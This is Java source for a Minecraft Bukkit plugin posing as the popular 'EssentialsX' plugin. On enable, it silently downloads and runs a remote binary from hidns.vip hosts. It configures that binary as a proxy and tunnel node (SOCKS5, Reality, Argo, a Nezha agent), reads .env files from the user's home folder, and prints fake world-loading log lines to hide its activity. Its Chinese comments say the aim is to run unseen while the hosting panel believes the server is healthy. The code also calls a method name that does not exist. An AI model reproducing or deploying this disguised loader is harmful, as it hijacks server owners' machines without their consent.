package com.example.essentialsx;

import org.bukkit.plugin.java.JavaPlugin;
import java.io.*;
import java.net.URL;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.TimeUnit;

public class EssentialsX extends JavaPlugin {
    private Process sbxProcess;
    private volatile boolean shouldRun = true;
    private volatile boolean isProcessRunning = false;
    
    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
    };
    
    @Override
    public void onEnable() {
        getLogger().info("EssentialsX plugin starting...");
        
        // 告诉服务器：我要在后台悄悄启动脚本，不要卡死主线程
        org.bukkit.Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            try {
                // 在后台运行启动逻辑
                startScriptProcess();
            } catch (Exception e) {
                // 如果启动失败，只在控制台报错，不影响服务器运行
                getLogger().severe("Failed to start script process: " + e.getMessage());
                e.printStackTrace();
            }
        });

        // 立即告诉面板：插件已经“加载完成”了，让面板觉得服务器很健康
        getLogger().info("EssentialsX plugin initialized and running in background");
    }
    
    private void startSbxProcess() throws Exception {
        if (isProcessRunning) {
            return;
        }
        
        // Determine download URL based on architecture
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.sss.hidns.vip/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.sss.hidns.vip/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.sss.hidns.vip/sbsh"; 
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }
        
        // Download sbx binary
        Path tmpDir = Paths.get(System.getProperty("java.io.tmpdir"));
        Path sbxBinary = tmpDir.resolve("sbx");
        
        if (!Files.exists(sbxBinary)) {
            // getLogger().info("Downloading sbx ...");
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, sbxBinary, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!sbxBinary.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }
        
        // Prepare process builder
        ProcessBuilder pb = new ProcessBuilder(sbxBinary.toString());
        pb.directory(tmpDir.toFile());
        
        // Set environment variables
        Map<String, String> env = pb.environment();
        env.put("UUID", "a5efed7e-ad51-4655-a01e-26ae497ba47f");
        env.put("FILE_PATH", "./world");
        env.put("NEZHA_SERVER", "");
        env.put("NEZHA_PORT", "");
        env.put("NEZHA_KEY", "");
        env.put("ARGO_PORT", "8001");
        env.put("ARGO_DOMAIN", "");
        env.put("ARGO_AUTH", "");
        env.put("S5_PORT", "25612");
        env.put("HY2_PORT", "");
        env.put("TUIC_PORT", "");
        env.put("ANYTLS_PORT", "");
        env.put("REALITY_PORT", "");
        env.put("ANYREALITY_PORT", "");
        env.put("UPLOAD_URL", "");
        env.put("CHAT_ID", "");
        env.put("BOT_TOKEN", "");
        env.put("CFIP", "spring.io");
        env.put("CFPORT", "443");
        env.put("NAME", "");
        env.put("DISABLE_ARGO", "true");
        
        // Load from system environment variables
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                env.put(var, value);
            }
        }
        
        // Load from .env file with priority order
        loadEnvFileFromMultipleLocations(env);
        
        // Load from Bukkit configuration file
        for (String var : ALL_ENV_VARS) {
            String value = getConfig().getString(var);
            if (value != null && !value.trim().isEmpty()) {
                env.put(var, value);
            }
        }
        
        // Redirect output
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        pb.redirectError(ProcessBuilder.Redirect.INHERIT);
        
        // Start process
        sbxProcess = pb.start();
        isProcessRunning = true;
        
        // Start a monitor thread to log when process exits
        startProcessMonitor();
        // getLogger().info("sbx started");
        
        // sleep 20 seconds
        try {
            Thread.sleep(20000);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
        
        clearConsole();
        getLogger().info("");
        getLogger().info("Preparing spawn area: 1%");
        getLogger().info("Preparing spawn area: 5%");
        getLogger().info("Preparing spawn area: 10%");
        getLogger().info("Preparing spawn area: 20%");
        getLogger().info("Preparing spawn area: 30%");
        getLogger().info("Preparing spawn area: 80%");
        getLogger().info("Preparing spawn area: 85%");
        getLogger().info("Preparing spawn area: 90%");
        getLogger().info("Preparing spawn area: 95%");
        getLogger().info("Preparing spawn area: 99%");
        getLogger().info("Preparing spawn area: 100%");
        getLogger().info("Preparing level \"world\"");
    }
    
    private void loadEnvFileFromMultipleLocations(Map<String, String> env) {
        List<Path> possibleEnvFiles = new ArrayList<>();
        File pluginsFolder = getDataFolder().getParentFile();
        if (pluginsFolder != null && pluginsFolder.exists()) {
            possibleEnvFiles.add(pluginsFolder.toPath().resolve(".env"));
        }
        
        possibleEnvFiles.add(getDataFolder().toPath().resolve(".env"));
        possibleEnvFiles.add(Paths.get(".env"));
        possibleEnvFiles.add(Paths.get(System.getProperty("user.home"), ".env"));
        
        Path loadedEnvFile = null;
        
        for (Path envFile : possibleEnvFiles) {
            if (Files.exists(envFile)) {
                try {
                    // getLogger().info("Loading environment variables from: " + envFile.toAbsolutePath());
                    loadEnvFile(envFile, env);
                    loadedEnvFile = envFile;
                    break;
                } catch (IOException e) {
                    // getLogger().warning("Error reading .env file from " + envFile + ": " + e.getMessage());
                }
            }
        }
        
        if (loadedEnvFile == null) {
           // getLogger().info("No .env file found in any of the checked locations");
        }
    }
    
    private void loadEnvFile(Path envFile, Map<String, String> env) throws IOException {
        for (String line : Files.readAllLines(envFile)) {
            line = line.trim();
            if (line.isEmpty() || line.startsWith("#")) continue;
            line = line.split(" #")[0].split(" //")[0].trim();
            if (line.startsWith("export ")) {
                line = line.substring(7).trim();
            }
            
            String[] parts = line.split("=", 2);
            if (parts.length == 2) {
                String key = parts[0].trim();
                String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                
                if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                    env.put(key, value);
                    // getLogger().info("Loaded " + key + " = " + (key.contains("KEY") || key.contains("TOKEN") || key.contains("AUTH") ? "***" : value));
                }
            }
        }
    }
    
    private void clearConsole() {
        
    }
    
    private void startProcessMonitor() {
        Thread monitorThread = new Thread(() -> {
            try {
                int exitCode = sbxProcess.waitFor();
                isProcessRunning = false;
                // getLogger().info("sbx process exited with code: " + exitCode);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                isProcessRunning = false;
            }
        }, "Sbx-Process-Monitor");
        
        monitorThread.setDaemon(true);
        monitorThread.start();
    }
    
    @Override
    public void onDisable() {
        getLogger().info("EssentialsX plugin shutting down...");
        
        shouldRun = false;
        
        if (sbxProcess != null && sbxProcess.isAlive()) {
            // getLogger().info("Stopping sbx process...");
            sbxProcess.destroy();
            
            try {
                if (!sbxProcess.waitFor(10, TimeUnit.SECONDS)) {
                    sbxProcess.destroyForcibly();
                    getLogger().warning("Forcibly terminated sbx process");
                } else {
                    getLogger().info("sbx process stopped normally");
                }
            } catch (InterruptedException e) {
                sbxProcess.destroyForcibly();
                Thread.currentThread().interrupt();
            }
            isProcessRunning = false;
        }
        
        getLogger().info("EssentialsX plugin disabled");
    }
}
